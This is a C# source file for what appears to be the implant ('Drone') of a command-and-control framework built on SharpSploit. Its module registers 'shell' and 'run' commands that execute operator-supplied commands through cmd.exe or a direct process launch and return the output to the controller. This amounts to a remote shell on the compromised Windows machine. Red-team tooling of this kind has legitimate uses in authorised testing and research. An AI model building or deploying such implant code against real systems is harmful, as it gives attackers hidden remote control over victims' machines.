using System.Linq;
using System.Threading;

using Drone.Models;
using Drone.SharpSploit.Execution;

namespace Drone.Modules
{
    public class ShellModule : DroneModule
    {
        public override string Name { get; } = "shell";
        public override void AddCommands()
        {
            var shell = new Command("shell", "Run a command via cmd.exe", RunShellCommand);
            shell.Arguments.Add(new Command.Argument("cmd", optional: false));

            var run = new Command("run", "Run a command", RunCommand);
            run.Arguments.Add(new Command.Argument("cmd", optional: false));
            run.Arguments.Add(new Command.Argument("args"));
            
            Commands.Add(shell);
            Commands.Add(run);
        }

        private void RunShellCommand(DroneTask task, CancellationToken token)
        {
            var command = string.Join("", task.Arguments);
            var result = Shell.ExecuteShellCommand(command);
            
            Drone.SendResult(task.TaskGuid, result);
        }
        
        private void RunCommand(DroneTask task, CancellationToken token)
        {
            var command = task.Arguments[0];
            var args = "";

            if (task.Arguments.Length > 1)
                args = string.Join("", task.Arguments.Skip(1));

            var result = Shell.ExecuteRunCommand(command, args);
            Drone.SendResult(task.TaskGuid, result);
        }
    }
}